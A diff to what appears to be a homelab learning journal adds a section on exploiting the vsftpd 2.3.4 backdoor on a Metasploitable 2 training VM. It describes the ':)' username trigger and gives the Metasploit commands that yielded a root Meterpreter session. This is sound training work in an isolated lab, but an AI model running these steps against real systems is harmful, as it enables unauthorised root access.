@@ -105,4 +105,29 @@ Network: VirtualBox Internal Network named `homelabnetwork`, subnet 192.168.56.0
 - **New habit adopted after the rebuild:** verify configuration survives a 
   reboot (static IP + keyboard layout) *before* taking a "clean" snapshot, 
   and take a fresh snapshot after every milestone, not just once at the start.
+## First exploit: vsftpd 2.3.4 backdoor
+
+**Target:** 192.168.56.30, port 21 (FTP), vsftpd 2.3.4
+**Tool:** Metasploit Framework (msfconsole)
+**Module:** exploit/unix/ftp/vsftpd_234_backdoor
+
+### What the vulnerability is
+vsftpd 2.3.4's source was compromised in 2011; a backdoor was inserted so that
+sending a username containing ":)" opens a root shell on port 6200, no
+authentication required. Metasploitable 2 ships this exact version
+intentionally for training.
+
+### Steps
+1. Identified vsftpd 2.3.4 via `nmap -sV` on port 21.
+2. In msfconsole: `search vsftpd` → found 
+   `exploit/unix/ftp/vsftpd_234_backdoor`.
+3. `use exploit/unix/ftp/vsftpd_234_backdoor`
+4. `set RHOSTS 192.168.56.30`
+5. `set LHOST 192.168.56.10`
+6. `run`
+
+### Result
+Meterpreter session opened. `getuid` confirmed root access (uid=0, gid=0).
+### Screenshot
+![vsftpd backdoor exploit](screenshots/vsftpd-exploit.png)
 
